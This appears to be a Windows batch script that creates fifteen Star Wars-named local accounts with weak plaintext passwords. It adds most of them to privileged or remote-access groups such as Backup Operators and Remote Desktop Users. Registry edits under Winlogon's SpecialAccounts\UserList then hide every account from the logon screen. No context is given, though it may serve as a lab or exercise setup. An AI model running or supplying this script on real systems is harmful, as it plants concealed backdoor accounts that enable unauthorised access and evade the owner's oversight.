net user leia_organa help_me_obiw@n /ADD
net user luke_skywalker use_the_f0rce /ADD
net user han_solo sh00t-first /ADD
net user artoo_detoo beep_b00p /ADD
net user c_three_pio pr0t0c0l /ADD
net user ben_kenobi thats_no_moon /ADD
net user darth_vader d@rk_sid3 /ADD
net user anakin_skywalker yipp33!! /ADD
net user jarjar_binks mesah_p@ssw0rd /ADD
net user lando_calrissian b@ckstab /ADD
net user boba_fett mandalorian1 /ADD
net user jabba_hutt not-a-slug12 /ADD
net user greedo hanShotFirst! /ADD
net user chewbacca rwaaaaawr5 /ADD
net user kylo_ren daddy_issues1 /ADD

net localgroup "Backup Operators" leia_organa /ADD
net localgroup "Certificate Service DCOM Access" luke_skywalker /ADD
net localgroup "Cryptographic Operators" han_solo /ADD
net localgroup "Distributed COM Users" artoo_detoo /ADD
net localgroup "Event Log Readers" c_three_pio /ADD
net localgroup "Guests" ben_kenobi /ADD
net localgroup "IIS_IUSRS" darth_vader /ADD
net localgroup "Network Configuration Operators" anakin_skywalker /ADD
net localgroup "Performance Log Users" jarjar_binks /ADD
net localgroup "Performance Monitor Users" lando_calrissian /ADD
net localgroup "Power Users" boba_fett /ADD
net localgroup "Print Operators" jabba_hutt /ADD
net localgroup "Remote Desktop Users" greedo /ADD
net localgroup "Replicator" chewbacca /ADD

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v leia_organa /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v luke_skywalker /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v han_solo /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v artoo_detoo /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v c_three_pio /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v ben_kenobi /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v darth_vader /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v anakin_skywalker /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v jarjar_binks /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v lando_calrissian /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v boba_fett /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v jabba_hutt /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v greedo /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v chewbacca /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v kylo_ren /t REG_DWORD /d 0 /f
